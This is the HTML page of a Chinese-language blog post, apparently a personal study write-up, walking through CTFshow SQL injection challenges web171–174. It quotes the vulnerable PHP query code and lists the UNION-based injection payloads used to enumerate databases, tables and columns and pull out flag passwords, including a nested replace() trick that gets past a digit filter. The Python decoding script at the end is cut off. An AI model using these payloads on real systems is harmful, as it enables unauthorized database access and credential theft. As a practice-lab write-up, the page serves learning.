@@ -1,0 +1,1060 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="panda">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://panda.github.io/2024/08/08/ctfshow_sql注入解题记录/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="CTFshow SQL注入解题记录入门web17112&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#x27;flag&#x27; and id &#x3D; &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow_sql注入解题记录">
+<meta property="og:url" content="https://panda.github.io/2024/08/08/ctfshow_sql%E6%B3%A8%E5%85%A5%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="panda&#39;s blog">
+<meta property="og:description" content="CTFshow SQL注入解题记录入门web17112&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#x27;flag&#x27; and id &#x3D; &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://panda.github.io/images/blog/1722908653339.png">
+<meta property="og:image" content="https://panda.github.io/images/blog/1722908936884.png">
+<meta property="og:image" content="https://panda.github.io/images/blog/1722909484766.png">
+<meta property="og:image" content="https://panda.github.io/images/blog/1722909663258.png">
+<meta property="og:image" content="https://panda.github.io/images/blog/1722910360695.png">
+<meta property="og:image" content="https://panda.github.io/images/blog/1722910821203.png">
+<meta property="og:image" content="https://panda.github.io/images/blog/1722910918525.png">
+<meta property="og:image" content="https://panda.github.io/images/blog/1722911355449.png">
+<meta property="og:image" content="https://panda.github.io/images/blog/1722911472286.png">
+<meta property="og:image" content="https://panda.github.io/images/blog/1722912971293.png">
+<meta property="og:image" content="https://panda.github.io/images/blog/1722913622005.png">
+<meta property="og:image" content="https://panda.github.io/images/blog/1723001009936.png">
+<meta property="article:published_time" content="2024-08-08T07:34:18.000Z">
+<meta property="article:modified_time" content="2024-08-08T07:37:23.224Z">
+<meta property="article:author" content="panda">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panda.github.io/images/blog/1722908653339.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/head.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/head.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            ctfshow_sql注入解题记录 -
+        
+        panda&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"panda.github.io","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"panda's blog","subtitle":{"text":["My name is panda","This is my first blog for study"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        panda&#39;s blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [40,0],
+                translateZ: 0,
+                opacity: [0,1],
+                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i,
+            }).add({
+                targets: '.ml13 .letter',
+                translateY: [0,-40],
+                opacity: [1,0],
+                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
+                easing: "easeInExpo",
+                duration: 1200,
+                delay: (el, i) => 100 + 30 * i,
+                complete: function() {
+                    hidePreloader(); // Call hidePreloader after the animation completes
+                }
+            });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                panda&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ctfshow_sql注入解题记录</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/head.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">panda</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-08-08 15:34:18</span>
+        <span class="mobile">2024-08-08 15:34:18</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-08-08 15:37:23</span>
+            <span class="mobile">2024-08-08 15:37:23</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="CTFshow-SQL注入解题记录"><a href="#CTFshow-SQL注入解题记录" class="headerlink" title="CTFshow SQL注入解题记录"></a>CTFshow SQL注入解题记录</h1><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure></div>
+
+<p>无任何过滤，直接万能密码取出所有数据即可：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or 1=1--+</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1722908653339.png"
+                      alt="1722908653339"
+                ></p>
+<p>或者直接根据需求把username&#x3D;‘flag’的提出来：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or username=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1722908936884.png"
+                      alt="1722908936884"
+                ></p>
+<h2 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h2><h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><blockquote>
+<p>注：</p>
+<p>此题本意只是讲解union联合注入的最基本步骤，所以会显得十分复杂且麻烦，尽管有很多方法可以快速做出，但此处不讲，重点在于新手入门每一步的思路及流程的讲解。</p>
+</blockquote>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>此处限制了字段<code>username</code>里不能强等于flag，所以只需要把username去掉，即可</p>
+<h4 id="先判断字段数："><a href="#先判断字段数：" class="headerlink" title="先判断字段数："></a>先判断字段数：</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; order by 1--+</span><br><span class="line">&#x27; order by 2--+</span><br></pre></td></tr></table></figure></div>
+
+<p>1和2都显示为： 无数据 </p>
+<p>当到3时报错显示为： 数据接口请求异常：parsererror </p>
+<p>说明字段时为2</p>
+<h4 id="判断字段位置："><a href="#判断字段位置：" class="headerlink" title="判断字段位置："></a>判断字段位置：</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,2--+</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1722909484766.png"
+                      alt="1722909484766"
+                ></p>
+<p>即可发现对应位置</p>
+<h4 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h4><p>知道字段对应的位置了，就可以利用位置显示一些我们所想要的数据，比如数据库：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,database()--+</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1722909663258.png"
+                      alt="1722909663258"
+                ></p>
+<p>可知数据库为：<code>ctfshow_web</code></p>
+<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p>知道数据库名称，下一步就得知道库中表是怎样的</p>
+<blockquote>
+<p><code>GROUP_CONCAT</code>函数</p>
+<p>在 MySQL 中，<code>GROUP_CONCAT</code> 函数用于将查询结果按指定顺序连接成一个字符串。通常结合 <code>GROUP BY</code> 子句一起使用，可以将同一组的多个字段值连接成一个字符串。</p>
+<p><code>information_schema</code> 是一个系统数据库，它存储有关数据库本身的信息，包括所有表的名称。 </p>
+</blockquote>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27; --+ //获取数据库里的表名</span><br></pre></td></tr></table></figure></div>
+
+<p>此处可以利用<code>group_concat()</code>函数，帮助我们把很多值连接一起放在同一字段；还可以利用<code>information_schema</code> 这个系统数据库，并且让 table_schema&#x3D;’ctfshow_web’，就可以获取上一步爆出数据库内的表了 ：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;--+</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1722910360695.png"
+                      alt="1722910360695"
+                ></p>
+<p>爆出来两个表名：<code>ctfshow_user</code>,<code>ctfshow_user2</code></p>
+<h4 id="爆字段名"><a href="#爆字段名" class="headerlink" title="爆字段名"></a>爆字段名</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>表名<span class="string">&#x27; --+ //获取表内字段名</span></span><br></pre></td></tr></table></figure></div>
+
+<p>结构与爆表名类似，就不多赘述</p>
+<p><code>ctfshow_user</code>：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1722910821203.png"
+                      alt="1722910821203"
+                ></p>
+<p>里面有三个字段，分别为：<code>id</code>,<code>username</code>,<code>password</code>，</p>
+<p><code>ctfshow_user2</code>：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user2<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1722910918525.png"
+                      alt="1722910918525"
+                ></p>
+<h4 id="爆字段值"><a href="#爆字段值" class="headerlink" title="爆字段值"></a>爆字段值</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(字段名1,字段名2) from 表名 --+ //获取字段值</span><br></pre></td></tr></table></figure></div>
+
+<p><code>ctfshow_user</code>：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(password) from ctfshow_user--+</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1722911355449.png"
+                      alt="1722911355449"
+                ></p>
+<p>发现是flag_not_here</p>
+<p> <code>ctfshow_user2</code>：</p>
+<p>由于不需要的值太多了，加一步username限制：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(password) from ctfshow_user2 where username=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1722911472286.png"
+                      alt="1722911472286"
+                ></p>
+<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个正则表达式表示匹配字符串 “flag”，且不区分大小写。 但只要不出现flag值即可，所以与web172同理：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,2,group_concat(password) from ctfshow_user3 where username=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1722912971293.png"
+                      alt="1722912971293"
+                ></p>
+<h3 id="web174（限制数字-replace）"><a href="#web174（限制数字-replace）" class="headerlink" title="web174（限制数字-replace）"></a>web174（限制数字-replace）</h3><p>这题路径有问题，点击之后值<a class="link"   target="_blank" rel="noopener" href="https://a41ed4b9-139a-4077-ac8c-870f258dd573.challenge.ctf.show/select-no-waf-3.php" >https://a41ed4b9-139a-4077-ac8c-870f258dd573.challenge.ctf.show/select-no-waf-3.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>得把select-no-waf-3.php改成select-no-waf-4.php：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://a41ed4b9-139a-4077-ac8c-870f258dd573.challenge.ctf.show/select-no-waf-4.php" >https://a41ed4b9-139a-4077-ac8c-870f258dd573.challenge.ctf.show/select-no-waf-4.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;      </span><br></pre></td></tr></table></figure></div>
+
+<p>此处可知，flag大小写和数字被过滤，主要就是把数字限制了，可以用replace替换， 所以我们需要将数字全部替换掉。</p>
+<h4 id="关键步骤"><a href="#关键步骤" class="headerlink" title="关键步骤"></a>关键步骤</h4><p>方法： <strong>将里面所有的数字用replace()替换</strong> （本题会将数字替换掉，且测试order有两行，所以这里select写的’a’,replace()这种。其他题用的话复制粘贴注意一下) </p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select &#x27;a&#x27;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#x27;0&#x27;,&#x27;pandaa&#x27;),&#x27;1&#x27;,&#x27;pandab&#x27;),&#x27;2&#x27;,&#x27;pandac&#x27;),&#x27;3&#x27;,&#x27;pandad&#x27;),&#x27;4&#x27;,&#x27;pandae&#x27;),&#x27;5&#x27;,&#x27;pandaf&#x27;),&#x27;6&#x27;,&#x27;pandag&#x27;),&#x27;7&#x27;,&#x27;pandah&#x27;),&#x27;8&#x27;,&#x27;pandai&#x27;),&#x27;9&#x27;,&#x27;pandaj&#x27;) from ctfshow_user4 --+</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1722913622005.png"
+                     
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;pandahbpandaapandadpandaffpandaapandab-bcbpandah-pandaefpandahpandab-pandajpandajpandaac-fpandabpandadpandaepandajdapandaipandaipandafcpandah&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>利用python脚本转换一下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;XXX&#x27;</span></span><br><span class="line">a= a.replace(<span class="string">&#x27;pandaa&#x27;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;pandab&#x27;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;pandac&#x27;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;pandad&#x27;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">a= a.replace(<span 